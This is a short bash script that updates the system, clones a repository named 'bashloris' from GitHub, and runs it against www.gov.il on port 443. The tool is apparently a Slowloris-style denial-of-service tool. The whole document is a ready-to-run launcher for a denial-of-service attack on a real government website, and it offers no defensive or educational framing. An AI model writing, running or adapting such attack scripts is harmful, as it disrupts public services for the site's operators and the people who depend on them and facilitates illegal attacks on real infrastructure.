#!/bin/bash

apt -y update && apt -y upgrade
pip install --upgrade pip

target_host="www.gov.il"
target_port="443"

task(){
  git clone "https://github.com/GinjaChris/bashloris.git"
  cd "bashloris"
  clear
  ./bashloris.sh $target_host $target_port 
}

task
